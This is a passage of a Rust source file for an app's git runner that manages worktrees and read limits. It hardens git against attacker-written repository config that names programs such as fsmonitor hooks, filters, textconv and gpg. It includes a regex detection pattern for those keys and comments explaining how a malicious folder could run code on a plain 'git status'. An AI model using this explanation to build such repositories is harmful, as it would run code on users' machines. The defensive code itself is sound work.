//! The git runner: every git operation goes through the `git` program on the user's path, run
//! with `std::process::Command`. Checked once at startup (`git --version`), never shelled through
//! a terminal. Worktrees are the unit of work: one branch in one folder of its own (PROJ-020).
//! GIT-067: removal deletes the branch only when no other worktree has it checked out and says
//! at which commit a kept branch was left, so it can be deleted later only while unmoved; moves
//! go through `git worktree move` so Git's records stay right; a base ref that is not a plain
//! ref spelling (leading dash, blanks, `..`) is never handed to git.

use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicU64, Ordering};

/// Counts every finished worktree add/remove/move/prune/repair that goes through this runner (the
/// `git worktree` commands and `Git::worktree_remove`, which mostly runs no git), so a reader that
/// cached the worktree list (the file fence) knows its copy is stale. A plain `git` in a shell is
/// not counted.
static WORKTREE_CHANGES: AtomicU64 = AtomicU64::new(0);

#[cfg(test)]
thread_local! {
    /// Tests only: this thread's own share of the count, exact while other tests run.
    static THIS_THREAD_CHANGES: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
}

pub fn worktree_changes() -> u64 {
    WORKTREE_CHANGES.load(Ordering::SeqCst)
}

/// Bumps [`WORKTREE_CHANGES`] when dropped, i.e. after the work ended, pass or fail (a failed add can still leave a folder).
struct WorktreeChange(bool);

impl WorktreeChange {
    fn watch(args: &[&str]) -> Self {
        let rest = after_options(args);
        WorktreeChange(rest.first() == Some(&"worktree") && rest.get(1).is_some_and(|s| ["add", "remove", "move", "prune", "repair"].contains(s)))
    }
}

impl Drop for WorktreeChange {
    fn drop(&mut self) {
        if self.0 {
            WORKTREE_CHANGES.fetch_add(1, Ordering::SeqCst);
            #[cfg(test)]
            THIS_THREAD_CHANGES.with(|c| c.set(c.get() + 1));
        }
    }
}

#[derive(Clone, Debug)]
pub struct Git {
    pub version: String,
}

/// One worktree of a repository, as `git worktree list --porcelain` reports it.
#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Worktree {
    pub path: String,
    pub branch: Option<String>,
    pub head: String,
    pub is_main: bool,
    /// The name the user typed when creating it (PROJ-021); the branch is shown when there is none.
    pub name: Option<String>,
    /// The workspace it was made from (PROJ-047), by path; the sidebar nests it there.
    pub parent: Option<String>,
    /// PROJ-070: set when Git has the worktree locked; the reason, empty when none was given.
    pub locked: Option<String>,
    /// The user hid it from the sidebar (PROJ-042); the main checkout never is.
    pub hidden: bool,
    /// PROJ-044: "main", "managed" (Kolux made it) or "external"; empty until the project's list sets it.
    pub kind: String,
    /// For an external worktree, where its visibility comes from (`visibility.rs`).
    pub source: Option<String>,
    /// AUTO-024: who made it, from Kolux's record of how it came to be ("app", "cli" or
    /// "automation"); none when Kolux has no record.
    pub made_by: Option<String>,
    /// VIEW-038: the issue or pull request number it is linked to, so the palette finds it by number.
    pub number: Option<u64>,
    /// EDIT-047: the comment it was made with (`worktree create --comment`); the palette shows it.
    pub comment: Option<String>,
}

/// GIT-063: what an unattended git is given, so it fails at once instead of waiting on a password
/// prompt no one can see, Git Credential Manager's window included. Saved credentials still work.
pub const NO_PROMPT: [(&str, &str); 2] = [("GIT_TERMINAL_PROMPT", "0"), ("GCM_INTERACTIVE", "never")];

#[cfg(test)]
thread_local! {
    /// Tests only: when set, every git this thread starts writes git's own trace2 event log to
    /// this file (inherited by anything that git starts in turn), so a test sees each process.
    pub(crate) static TRACE2: std::cell::RefCell<Option<PathBuf>> = const { std::cell::RefCell::new(None) };
    /// Tests only: when set, every git this thread starts reads only the repository's own config:
    /// an empty global file, no system file, and nothing the parent process injected (config
    /// pairs or a password helper), so a test's result never depends on this PC's git setup.
    pub(crate) static ISOLATED: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
}

/// Tests only: an empty file to stand in for the user's global git config.
#[cfg(test)]
pub(crate) fn empty_global_config() -> PathBuf {
    let path = std::env::temp_dir().join("kolux-rs-test-empty-gitconfig");
    if std::fs::metadata(&path).map(|m| m.len() != 0).unwrap_or(true) {
        let _ = std::fs::write(&path, "");
    }
    path
}

/// T-779 (P2A-01): the git config Kolux forces on every git it runs, as `GIT_CONFIG_COUNT`
/// environment slots, so the command line stays as written. `core.fsmonitor=false` always: a folder
/// added as a project may arrive with an attacker-written `.git/config` naming a program there, and
/// git would run it on the first `status`; the environment outranks every config file, so the
/// program never runs under Kolux. `core.longpaths=true` on Windows (GIT-070). `existing` is the
/// user's own `GIT_CONFIG_COUNT`: their pairs stay in slots `0..n` and ours follow, so neither side
/// is dropped (before T-779 Kolux injected nothing when the user's shell set the variable). A count
/// git itself would reject as bogus is treated as none. `repo_programs` are the repository's own
/// program-naming keys (see `repo_programs`), blanked the same way after the fixed pairs.
pub(crate) fn injected_config(existing: Option<&std::ffi::OsStr>, repo_programs: &[(String, String)]) -> Vec<(String, String)> {
    let start = existing.and_then(|v| v.to_str()).and_then(|v| v.trim().parse::<usize>().ok()).unwrap_or(0);
    // `log.showSignature=false`: a repository's own `log.showSignature=true` with a `gpg.program` of its
    // choosing would run that program on every `log` (review fix 2); Kolux never shows signatures.
    let mut pairs = vec![("core.fsmonitor", "false"), ("log.showSignature", "false")];
    if cfg!(windows) {
        pairs.push(("core.longpaths", "true"));
    }
    pairs.extend(repo_programs.iter().map(|(k, v)| (k.as_str(), v.as_str())));
    let mut out = Vec::with_capacity(pairs.len() * 2 + 1);
    for (i, (key, value)) in pairs.iter().enumerate() {
        let slot = start + i;
        out.push((format!("GIT_CONFIG_KEY_{slot}"), key.to_string()));
        out.push((format!("GIT_CONFIG_VALUE_{slot}"), value.to_string()));
    }
    out.push(("GIT_CONFIG_COUNT".to_string(), (start + pairs.len()).to_string()));
    out
}

/// T-779 (P2A-01, review finding 1): the config keys through which a repository's own config
/// names a program that git runs on a plain read. A clean filter runs on `status` and `diff` for
/// every file whose index stat is stale (every file of a folder extracted from a zip), a smudge
/// filter on checkout, a textconv or external diff on `diff`/`show` of a commit, a signature
/// program on a log that shows signatures (review fix 2). Only the keys a listing finds are
/// blanked, so a user's own drivers in their global config stay as they are.
const REPO_PROGRAM_KEYS: &str = r"^filter\..*\.(clean|smudge|process|required)$|^diff\..*\.(textconv|command)$|^gpg\.([^.]+\.)?program$";

/// The program lines `git lfs install` writes, which run the user's own installed git-lfs and
/// nothing the folder brought along; a driver made only of these is left alone, so a repository
/// with LFS set up locally keeps working under Kolux.
const LFS_LINES: [(&str, &str); 3] = [("clean", "git-lfs clean -- %f"), ("smudge", "git-lfs smudge -- %f"), ("process", "git-lfs filter-process")];

/// What a git run may do with the repository's own program keys (review fix 2, Txais 2026-11-08,
/// DT-C229): a read always has them blanked; a write that runs the repository's clean or smudge
/// filters (add, commit, checkout, worktree add...) keeps them only in a trusted folder.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub(crate) enum Access {
    Reads,
    TrustedWrite,
}

/// The program keys a listing found, as (key, value) in the repository's own scopes. `scoped` is
/// the shape of `git config -z --show-scope --get-regexp` (records `scope NUL key LF value NUL`;
/// only the local and worktree scopes count: the user's global and system drivers stay); unscoped
/// is `git config -z --file <repo config> --get-regexp` (records `key LF value NUL`), which has
/// only the repository's own scope to begin with.
fn parse_listing(listing: &[u8], scoped: bool) -> Vec<(String, String)> {
    let mut found: Vec<(String, String)> = Vec::new();
    let mut records = listing.split(|b| *b == 0);
    loop {
        let entry = if scoped {
            let Some(scope) = records.next() else { break };
            let Some(entry) = records.next() else { break };
            if !matches!(scope, b"local" | b"worktree") {
                continue;
            }
            entry
        } else {
            let Some(entry) = records.next() else { break };
            entry
        };
        if entry.is_empty() {
            continue;
        }
        let entry = String::from_utf8_lossy(entry);
        let (key, value) = entry.split_once('\n').unwrap_or((&entry, ""));
        found.push((key.to_string(), value.trim_end_matches('\r').to_string()));
    }
    found
}

/// The overrides for what a listing found: every program key in the repository's own scope becomes
/// an empty value, so git has no program to run, and the driver's `required` is forced off, so a
/// blanked clean filter does not fail the read instead. git-lfs's standard lines are the one
/// exception (see `LFS_LINES`). `TrustedWrite` blanks only the diff programs: the folder's own
/// filters (and signing program) are what the user's write is meant to run.
fn overrides_for(found: &[(String, String)], access: Access) -> Vec<(String, String)> {
    // A filter driver is git-lfs's own when every program line it has is the standard one.
    let is_lfs = |driver: &str| {
        let lines: Vec<&(String, String)> = found.iter().filter(|(k, _)| k.strip_prefix(driver).is_some_and(|rest| matches!(rest, ".clean" | ".smudge" | ".process"))).collect();
        !lines.is_empty() && lines.iter().all(|(k, v)| LFS_LINES.iter().any(|(suffix, line)| k.ends_with(suffix) && v == line))
    };
    let mut out = Vec::with_capacity(found.len());
    for (key, _) in found {
        let Some(driver) = key.rsplit_once('.').map(|(d, _)| d) else { continue };
        if access == Access::TrustedWrite && !key.starts_with("diff.") {
            continue;
        }
        if driver.starts_with("filter.") && is_lfs(driver) {
            continue;
        }
        let blank = if key.ends_with(".required") { "false" } else { "" };
        if !out.iter().any(|(k, _): &(String, String)| k == key) {
            out.push((key.clone(), blank.to_string()));
        }
    }
    out
}

/// The overrides for one top-level listing (see `parse_listing`), for a read.
#[cfg(test)]
pub(crate) fn repo_program_overrides(listing: &[u8]) -> Vec<(String, String)> {
    overrides_for(&parse_listing(listing, true), Access::Reads)
}

/// The filter drivers a repository names that would run a program of the folder's own (not
/// git-lfs's standard one) on a write: `(driver, key)` for each, in the order found. A driver with
/// only a `required` line runs nothing and is not listed.
fn program_filters(found: &[(String, String)]) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = Vec::new();
    for (key, _) in overrides_for(found, Access::Reads) {
        let Some(rest) = key.strip_prefix("filter.") else { continue };
        let Some((driver, line)) = rest.rsplit_once('.') else { continue };
        if matches!(line, "clean" | "smudge" | "process") && !out.iter().any(|(d, _)| d == driver) {
            out.push((driver.to_string(), key.clone()));
        }
    }
    out
}

/// The git dir and the shared (common) git dir for a git run in `cwd`, found from the `.git`
/// folder or file of `cwd` or an ancestor without running git. None when `cwd` is in no repository.
fn repo_dirs(cwd: &Path) -> Option<(PathBuf, PathBuf)> {
    let dot_git = cwd.ancestors().take(64).map(|d| d.join(".git")).find(|g| g.exists())?;
    let git_dir = if dot_git.is_dir() {
        dot_git
    } else {
        // A linked worktree or a submodule: `.git` is a file saying `gitdir: <path>`, relative to the folder it is in.
        let text = std::fs::read_to_string(&dot_git).ok()?;
        let rel = text.lines().find_map(|l| l.strip_prefix("gitdir:"))?.trim();
        dot_git.parent()?.join(rel)
    };
    // The shared folder: `commondir` names it (relative to the git dir) for a linked worktree.
    let common = std::fs::read_to_string(git_dir.join("commondir")).ok().map(|t| git_dir.join(t.trim())).unwrap_or_else(|| git_dir.clone());
    Some((git_dir, common))
}

/// Every submodule's own config under `modules` (`.git/modules`), nested submodules included
/// (a submodule's git folder holds its own `modules`). A git run in the parent lets the child gits
/// it starts for a submodule read that config, so a filter named there runs as well (review fix 2).
fn module_configs(modules: &Path, out: &mut Vec<PathBuf>, depth: usize) {
    if depth > 8 || out.len() >= 256 {
        return;
    }
    let Ok(entries) = std::fs::read_dir(modules) else { return };
    for entry in entries.flatten() {
        if !entry.file_type().is_ok_and(|t| t.is_dir()) {
            continue;
        }
        let dir = entry.path();
        let config = dir.join("config");
        if config.is_file() {
            out.push(config);
            module_configs(&dir.join("modules"), out, depth + 1);
        } else {
            // A submodule named `a/b` lives in `modules/a/b`: `a` is only a folder on the way.
            module_configs(&dir, out, depth + 1);
        }
    }
}

/// The config files `include.path` and `includeIf.<condition>.path` name in `file` (read as text, no
/// git run): a relative path is relative to the including file, `~/` is the home folder. Every
/// target counts whether or not its condition holds, so the stamp only errs toward a fresh listing.
fn include_targets(file: &Path) -> Vec<PathBuf> {
    let Ok(text) = std::fs::read_to_string(file) else { return Vec::new() };
    let mut out = Vec::new();
    let take = |line: &str, out: &mut Vec<PathBuf>| {
        let Some((key, value)) = line.split_once('=') else { return };
        if !key.trim().eq_ignore_ascii_case("path") {
            return;
        }
        let value = value.trim();
        let value = match value.strip_prefix('"') {
            Some(quoted) => quoted.split('"').next().unwrap_or(""),
            None => value.split([';', '#']).next().unwrap_or("").trim(),
        };
        let path = if let Some(rest) = value.strip_prefix("~/") {
            std::env::var(if cfg!(windows) { "USERPROFILE" } else { "HOME" }).map(|h| PathBuf::from(h).join(rest)).unwrap_or_default()
        } else if Path::new(value).is_absolute() {
            PathBuf::from(value)
        } else {
            file.parent().map(|d| d.join(value)).unwrap_or_default()
        };
        if !value.is_empty() && !path.as_os_str().is_empty() {
            out.push(path);
        }
    };
    let mut in_include = false;
    for line in text.lines() {
        let line = line.trim();
        if let Some(header) = line.strip_prefix('[') {
            let name = header.split(|c: char| c == ']' || c == '"' || c.is_whitespace()).next().unwrap_or("");
            in_include = name.eq_ignore_ascii_case("include") || name.eq_ignore_ascii_case("includeif");
            // `[include] path = x` on one line is legal.
            if let Some((_, rest)) = header.rsplit_once(']') {
                if in_include && !rest.trim().is_empty() {
                    take(rest.trim(), &mut out);
                }
            }
        } else if in_include {
            take(line, &mut out);
        }
    }
    out
}

/// `files` and, depth first, every file they include (git itself stops at depth 10).
fn with_includes(files: &[PathBuf]) -> Vec<PathBuf> {
    let mut all: Vec<PathBuf> = Vec::new();
    let mut todo: Vec<(PathBuf, usize)> = files.iter().cloned().map(|f| (f, 0)).collect();
    while let Some((file, depth)) = todo.pop() {
        if all.contains(&file) || all.len() >= 512 {
            continue;
        }
        if depth < 10 {
            todo.extend(include_targets(&file).into_iter().map(|f| (f, depth + 1)));
        }
        all.push(file);
    }
    all
}

/// The config files that decide the program keys for a git run in `cwd`: the shared `config` and
/// the worktree's own `config.worktree` (listed through git, which follows their includes), and
/// every submodule's own `config` (listed with `--file`). None when `cwd` is in no repository.
fn repo_config_files(cwd: &Path) -> Option<(Vec<PathBuf>, Vec<PathBuf>)> {
    let (git_dir, common) = repo_dirs(cwd)?;
    let mut subs = Vec::new();
    module_configs(&common.join("modules"), &mut subs, 0);
    Some((vec![common.join("config"), git_dir.join("config.worktree")], subs))
}

/// How the config files looked when a listing was taken: modification time and size of each.
type ConfigStamp = Vec<(PathBuf, Option<(std::time::SystemTime, u64)>)>;

fn config_stamp(files: &[PathBuf]) -> ConfigStamp {
    with_includes(files).into_iter().map(|f| (f.clone(), std::fs::metadata(&f).ok().and_then(|m| Some((m.modified().ok()?, m.len()))))).collect()
}

/// One listing per repository, kept while its config files are unchanged, so a status read costs
/// the same number of git processes as before (T-033-e sizes the watcher's process count on it).
/// One cached listing: the folder, how its config files looked, and the program keys they gave.
type RepoPrograms = (PathBuf, ConfigStamp, Vec<(String, String)>);
static REPO_PROGRAMS: std::sync::Mutex<Vec<RepoPrograms>> = std::sync::Mutex::new(Vec::new());
const REPO_PROGRAMS_KEPT: usize = 256;

/// The program keys the repository (and every submodule) names, for a git run in `cwd`; `prefix`
/// is the run's own leading options (`-C dir`, `-c k=v`), so the listing reads the same repository.
/// The listing is a plain `git config` read, which runs no program of the repository's.
fn repo_programs(prefix: &[&str], cwd: &Path) -> Vec<(String, String)> {
    let files = repo_config_files(cwd);
    let stamp = files.as_ref().map(|(top, subs)| config_stamp(&[top.as_slice(), subs.as_slice()].concat()));
    if let Some(stamp) = &stamp {
        if let Ok(cache) = REPO_PROGRAMS.lock() {
            if let Some((_, _, found)) = cache.iter().find(|(dir, s, _)| dir == cwd && s == stamp) {
                return found.clone();
            }
        }
    }
    let listing = |args: &[&str]| -> Vec<u8> {
        // Exit 1 is "no such key": nothing to blank. Any other failure (not a repository) the same.
        base_command(args, Some(cwd), &[]).stdin(std::process::Stdio::null()).stderr(std::process::Stdio::null()).output().ok().filter(|o| o.status.success()).map(|o| o.stdout).unwrap_or_default()
    };
    let mut args: Vec<&str> = prefix.to_vec();
    args.extend(["config", "-z", "--show-scope", "--get-regexp", REPO_PROGRAM_KEYS]);
    let mut found = parse_listing(&listing(&args), true);
    for config in files.iter().flat_map(|(_, subs)| subs) {
        let config = config.to_string_lossy();
        for pair in parse_listing(&listing(&["config", "-z", "--includes", "--file", &config, "--get-regexp", REPO_PROGRAM_KEYS]), false) {
            if !found.contains(&pair) {
                found.push(pair);
            }
        }
    }
    if let Some(stamp) = stamp {
        if let Ok(mut cache) = REPO_PROGRAMS.lock() {
            cache.retain(|(dir, _, _)| dir != cwd);
            if cache.len() >= REPO_PROGRAMS_KEPT {
                cache.remove(0);
            }
            cache.push((cwd.to_path_buf(), stamp, found.clone()));
        }
    }
    found
}

/// `args` up to the git command word: the leading `-C dir` / `-c k=v` options a run was given.
fn leading_options<'a, 'b>(args: &'a [&'b str]) -> &'a [&'b str] {
    let rest = after_options(args);
    &args[..args.len() - rest.len()]
}

/// Whether `args` is a git command that runs the repository's clean or smudge filters to produce
/// stored or checked-out content: staging, committing, and everything that writes the working
/// tree or the index from other content. Everything else (reads, fetch, push, branch, config,
/// clone, whose new repository carries none of this folder's filters) never needs them.
fn writes_content(args: &[&str]) -> bool {
    let rest = after_options(args);
    let second = rest.get(1).copied();
    match rest.first().copied() {
        Some("add" | "commit" | "checkout" | "switch" | "restore" | "reset" | "merge" | "pull" | "rebase" | "cherry-pick" | "revert" | "apply" | "am" | "read-tree" | "checkout-index" | "sparse-checkout") => true,
        Some("worktree") => second == Some("add"),
        Some("stash") => !matches!(second, Some("list" | "show")),
        Some("submodule") => matches!(second, Some("update" | "add")),
        _ => false,
    }
}

/// Whether the user has trusted `dir` (or the main checkout it is a worktree of) with an agent:
/// the same answer `trust.rs` reads before it pre-trusts a worktree (`carries_trust`: Claude's
/// `hasTrustDialogAccepted`, Codex's `trust_level = "trusted"`), nothing more. Kolux never sets
/// this here.
fn folder_trusted(dir: &Path) -> bool {
    let mut folders = vec![dir.to_path_buf()];
    if let Some((_, common)) = repo_dirs(dir) {
        // A linked worktree names its shared folder as "<git dir>/../..": resolve it to see the .git it is.
        let common = common.canonicalize().unwrap_or(common);
        if let Some(main) = common.parent().filter(|_| common.file_name().is_some_and(|n| n == ".git")) {
            folders.push(main.to_path_buf());
        }
    }
    let (claude, codex) = trust_files();
    let claude_doc = std::fs::read_to_string(claude).ok().and_then(|t| serde_json::from_str::<serde_json::Value>(&t).ok());
    let codex_doc = std::fs::read_to_string(codex).ok().and_then(|t| t.parse::<toml_edit::DocumentMut>().ok());
    folders.iter().any(|folder| {
        let by_claude = claude_doc.as_ref().zip(crate::trust::claude_key(folder).ok()).is_some_and(|(doc, key)| doc["projects"][key]["hasTrustDialogAccepted"] == serde_json::json!(true));
        let by_codex = codex_doc.as_ref().zip(crate::trust::codex_key(folder).ok()).is_some_and(|(doc, key)| doc.get("projects").and_then(|p| p.get(&key)).and_then(|p| p.get("trust_level")).and_then(|l| l.as_str()) == Some("trusted"));
        by_claude || by_codex
    })
}

#[cfg(test)]
thread_local! {
    /// Tests only: the agent config files `folder_trusted` reads (Claude's, Codex's) instead of the user's own.
    pub(crate) static TRUST_FILES: std::cell::RefCell<Option<(PathBuf, PathBuf)>> = const { std::cell::RefCell::new(None) };
}

#[cfg(not(test))]
fn trust_files() -> (PathBuf, PathBuf) {
    (crate::trust::claude_config_file(), crate::trust::codex_config_file())
}

/// Tests never read the developer's own agent files: no trust unless a test grants it.
#[cfg(test)]
fn trust_files() -> (PathBuf, PathBuf) {
    TRUST_FILES.with(|f| f.borrow().clone()).unwrap_or_else(|| (std::env::temp_dir().join("kolux-rs-test-no-claude.json"), std::env::temp_dir().join("kolux-rs-test-no-codex.toml")))
}

/// Tests only: the user trusts `folder` in Claude's file, for this test's thread.
#[cfg(test)]
pub(crate) fn trust_for_test(folder: &Path) {
    let key = crate::trust::claude_key(folder).unwrap();
    let mut project = serde_json::Map::new();
    project.insert("hasTrustDialogAccepted".into(), serde_json::Value::Bool(true));
    let mut projects = serde_json::Map::new();
    projects.insert(key, serde_json::Value::Object(project));
    let mut doc = serde_json::Map::new();
    doc.insert("projects".into(), serde_json::Value::Object(projects));
    let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_nanos()).unwrap_or(0);
    let file = std::env::temp_dir().join(format!("kolux-rs-test-trust-{}-{nanos}.json", std::process::id()));
    std::fs::write(&file, serde_json::Value::Object(doc).to_string()).unwrap();
    TRUST_FILES.with(|f| *f.borrow_mut() = Some((file, std::env::temp_dir().join("kolux-rs-test-no-codex.toml"))));
}

/// Why `args` must not run in `cwd` (review fix 2, DT-C229): it writes content, the folder names a
/// filter of its own, and the folder is not trusted. Such a write is refused instead of run with
/// the filter skipped, because a skipped clean or smudge filter stores plaintext where the
/// repository expects ciphertext (git-crypt, transcrypt) or checks ciphertext out. None when the
/// write may go ahead.
pub(crate) fn write_refusal(args: &[&str], cwd: Option<&Path>) -> Option<String> {
    let dir = cwd?;
    if !writes_content(args) {
        return None;
    }
    let filters = program_filters(&repo_programs(leading_options(args), dir));
    if filters.is_empty() || folder_trusted(dir) {
        return None;
    }
    let names = filters.iter().map(|(d, k)| format!("\"{d}\" ({k})")).collect::<Vec<_>>().join(", ");
    let rest = after_options(args);
    let verb = rest.iter().take(if rest.first() == Some(&"worktree") { 2 } else { 1 }).copied().collect::<Vec<_>>().join(" ");
    Some(format!(
        "Kolux did not run `git {verb}` in {}: the folder has its own git filter {names}, which runs a program every time files are staged or checked out, and the folder is not trusted. Trust the folder (open an agent in it and accept its trust prompt), then try again.",
        dir.display()
    ))
}

/// A git process with Kolux's environment (see `base_command`) for a run that may write: refused
/// with `write_refusal`'s message when the folder's own filter must not run unasked.
pub(crate) fn command_checked(args: &[&str], cwd: Option<&Path>) -> Result<Command, String> {
    match write_refusal(args, cwd) {
        Some(why) => Err(why),
        None => Ok(command(args, cwd)),
    }
}

/// A git process with Kolux's environment (see `base_command`), its repository's own program keys
/// blanked when it runs in a folder (T-779, review finding 1): always for a read; for a write that
/// runs filters only in an untrusted folder (`command_checked` refuses a write there that has a
/// filter, so only a caller that skips it ever sees the blanked write).
pub(crate) fn command(args: &[&str], cwd: Option<&Path>) -> Command {
    let found = cwd.map(|dir| repo_programs(leading_options(args), dir)).unwrap_or_default();
    let trusted_write = !program_filters(&found).is_empty() && writes_content(args) && cwd.is_some_and(folder_trusted);
    base_command(args, cwd, &overrides_for(&found, if trusted_write { Access::TrustedWrite } else { Access::Reads }))
}

fn base_command(args: &[&str], cwd: Option<&Path>, repo_programs: &[(String, String)]) -> Command {
    let mut cmd = Command::new("git");
    cmd.args(args);
    #[cfg(test)]
    TRACE2.with(|t| {
        if let Some(path) = &*t.borrow() {
            cmd.env("GIT_TRACE2_EVENT", path);
        }
    });
    #[cfg(test)]
    if ISOLATED.with(|i| i.get()) {
        cmd.env("GIT_CONFIG_GLOBAL", empty_global_config()).env("GIT_CONFIG_NOSYSTEM", "1");
        for v in ["GIT_CONFIG_COUNT", "GIT_CONFIG_PARAMETERS", "GIT_ASKPASS", "SSH_ASKPASS"] {
            cmd.env_remove(v);
        }
    }
    // GIT-001 (T-033-b): a status read never rewrites the index on its own (git's optional lock),
    // so the Source Control watcher is not woken by its own reads. Required locks are unaffected.
    cmd.env("GIT_OPTIONAL_LOCKS", "0");
    if let Some(dir) = cwd {
        cmd.current_dir(dir);
    }
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000; // no console flashes up behind the app
        cmd.creation_flags(CREATE_NO_WINDOW);
    }
    // GIT-070: on macOS and Linux git leads its own process group, so stopping a stalled read
    // (procs::kill_tree's group signal) also ends the hooks, diff tools and pagers it started.
    // Outside the terminal's foreground group a prompt would stop git (SIGTTIN): it fails at once.
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        cmd.process_group(0).env("GIT_TERMINAL_PROMPT", "0");
    }
    // T-779 (P2A-01) and GIT-070: the config Kolux forces (`injected_config`), appended after any
    // pairs the user's own shell injects the same way; a git older than 2.31 ignores all of it.
    let existing = std::env::var_os("GIT_CONFIG_COUNT");
    // An isolated test sees no pair the parent shell injected (see above), so ours start at slot 0.
    #[cfg(test)]
    let existing = if ISOLATED.with(|i| i.get()) { None } else { existing };
    for (name, value) in injected_config(existing.as_deref(), repo_programs) {
        cmd.env(name, value);
    }
    cmd
}

/// GIT-070: how many short git reads one worktree runs at once. There is no app-wide cap: sixteen
/// worktrees each get their own turns, and a slow repository never holds up another one.
const READS_PER_WORKTREE: usize = 4;
/// GIT-070: how long a short read may take before it and everything it started are stopped.
pub(crate) const SHORT_READ_LIMIT: std::time::Duration = std::time::Duration::from_secs(90);

/// GIT-070: the git commands that only read and finish quickly. Only these wait for a turn and get
/// `SHORT_READ_LIMIT`; everything else (worktree add, fetch, clone, push, pull, commit, merge...)
/// runs at once with no time limit added here, so a long checkout or transfer is never cut off.
const SHORT_READS: [&str; 18] = ["status", "diff", "log", "show", "rev-parse", "rev-list", "ls-files", "ls-tree", "for-each-ref", "cat-file", "cherry", "merge-base", "symbolic-ref", "describe", "check-ignore", "name-rev", "blame", "count-objects"];

/// GIT-070: whether `args` is a short read (see `SHORT_READS`); `worktree` counts only as
/// `worktree list`. Leading `-c key=value` / `-C dir` and other options are skipped.
pub(crate) fn short_read(args: &[&str]) -> bool {
    let rest = after_options(args);
    rest.first().is_some_and(|w| SHORT_READS.contains(w) || (*w == "worktree" && rest.get(1) == Some(&"list")))
}

/// `args` from the git command word on: leading `-c key=value` / `-C dir` and other options skipped.
fn after_options<'a, 'b>(args: &'a [&'b str]) -> &'a [&'b str] {
    let mut i = 0;
    while let Some(w) = args.get(i) {
        if *w == "-c" || *w == "-C" {
            i += 2;
        } else if w.starts_with('-') {
            i += 1;
        } else {
            return &args[i..];
        }
    }
    &[]
}

/// GIT-070: turns for short reads, counted per worktree. Foreground work (the panel on screen) that
/// is waiting goes before background work (badges, sweeps) waiting on the same worktree.
pub(crate) struct Limiter {
    at_once: usize,
    /// worktree -> (running, foreground callers waiting)
    state: std::sync::Mutex<std::collections::BTreeMap<PathBuf, (usize, usize)>>,
    freed: std::sync::Condvar,
}

pub(crate) struct Turn<'a>(&'a Limiter, PathBuf);

impl Drop for Turn<'_> {
    fn drop(&mut self) {
        let mut s = self.0.state.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(e) = s.get_mut(&self.1) {
            // A turn is dropped once, but a poisoned map or a future refactor must never take the
            // process down through a release-mode underflow (`panic = "abort"`).
            e.0 = e.0.saturating_sub(1);
            if *e == (0, 0) {
                s.remove(&self.1);
            }
        }
        self.0.freed.notify_all();
    }
}

impl Limiter {
    pub(crate) const fn new(at_once: usize) -> Self {
        Limiter { at_once, state: std::sync::Mutex::new(std::collections::BTreeMap::new()), freed: std::sync::Condvar::new() }
    }

    pub(crate) fn enter(&self, worktree: &Path, foreground: bool) -> Turn<'_> {
        let key = worktree.to_path_buf();
        let mut s = self.state.lock().unwrap_or_else(|e| e.into_inner());
        s.entry(key.clone()).or_default().1 += usize::from(foreground);
        loop {
            // A background caller is not counted while it waits, so its entry may have gone.
            let (running, waiting) = *s.entry(key.clone()).or_default();
            if running < self.at_once && (foreground || waiting == 0) {
                break;
            }
            s = self.freed.wait(s).unwrap_or_else(|e| e.into_inner());
        }
        // The entry is created above, but `entry` keeps this panic-free if it ever is not.
        let e = s.entry(key.clone()).or_default();
        e.0 += 1;
        if foreground {
            e.1 = e.1.saturating_sub(1);
            self.freed.notify_all();
        }
        Turn(self, key)
    }

    #[cfg(test)]
    pub(crate) fn running(&self, worktree: &Path) -> usize {
        self.state.lock().unwrap().get(worktree).map_or(0, |e| e.0)
    }
}

static LIMITER: Limiter = Limiter::new(READS_PER_WORKTREE);

thread_local! {
    static FOREGROUND: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
}

/// GIT-070: runs `read` with its short git reads counted as foreground work.
pub(crate) fn foreground<T>(read: impl FnOnce() -> T) -> T {
    let was = FOREGROUND.replace(true);
    let out = read();
    FOREGROUND.set(was);
    out
}

/// GIT-070, for tests: whether this thread's short reads are counted as foreground work.
#[cfg(test)]
pub(crate) fn foreground_lane() -> bool {
    FOREGROUND.get()
}

/// Runs git and returns its stdout byte for byte; a non-zero exit becomes an error carrying stderr.
/// GIT-070: a short read waits for its worktree's turn and is stopped at `SHORT_READ_LIMIT`.
pub(crate) fn output(args: &[&str], cwd: Option<&Path>) -> Result<Vec<u8>, String> {
    gated(args, cwd, &LIMITER, SHORT_READ_LIMIT)
}

fn gated(args: &[&str], cwd: Option<&Path>, limiter: &Limiter, limit: std::time::Duration) -> Result<Vec<u8>, String> {
    if !short_read(args) {
        return plain_output(args, cwd);
    }
    let _turn = cwd.map(|d| limiter.enter(d, FOREGROUND.get()));
    bytes_within(args, cwd, limit)
}

/// git with no turn and no time limit: the long-running and writing commands.
fn plain_output(args: &[&str], cwd: Option<&Path>) -> Result<Vec<u8>, String> {
    let _changed = WorktreeChange::watch(args);
    let out = command_checked(args, cwd)?.output().map_err(|e| format!("could not run git: {e}"))?;
    if out.status.success() {
        Ok(out.stdout)
    } else {
        let err = String::from_utf8_lossy(&out.stderr).trim().to_string();
        Err(if err.is_empty() { format!("git {} failed ({})", args.join(" "), out.status) } else { err })
    }
}

/// PROJ-072: Git's complaint about a Windows path past its length limit.
pub(crate) fn path_too_long(err: &str) -> bool {
    let t = err.to_lowercase();
    t.contains("filename too long") || t.contains("path too long") || t.contains("file name too long")
}

/// PROJ-072: the form of `p` that Windows accepts past 260 characters (`\?\` in front); unchanged elsewhere.
pub(crate) fn long_path(p: &Path) -> PathBuf {
    #[cfg(windows)]
    {
        let s = p.to_string_lossy();
        if p.is_absolute() && !s.starts_with(r"\\?\") {
            return PathBuf::from(format!(r"\\?\{}", s.replace('/', r"\")));
        }
    }
    p.to_path_buf()
}

/// PROJ-074: the name every trash folder starts with (hidden by the leading dot, and on Windows
/// by the hidden attribute). After-list row 130: only the exact `.kolux-trash-<hex>-<hex>-<name>`
